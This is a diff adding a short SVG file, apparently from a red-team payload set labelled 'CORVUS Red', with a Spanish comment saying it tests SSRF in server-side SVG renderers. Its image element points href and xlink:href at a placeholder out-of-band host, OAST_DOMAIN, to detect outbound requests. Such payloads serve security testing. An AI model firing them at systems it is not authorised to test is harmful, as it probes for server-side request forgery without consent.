@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- CORVUS Red · SSRF en renderizadores de SVG (miniaturas, conversiones a PNG/PDF): el servidor pide el recurso remoto. -->
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
+  <image href="https://OAST_DOMAIN/corvus-ssrf-svg-image" xlink:href="https://OAST_DOMAIN/corvus-ssrf-svg-xlink" width="200" height="200"/>
+</svg>
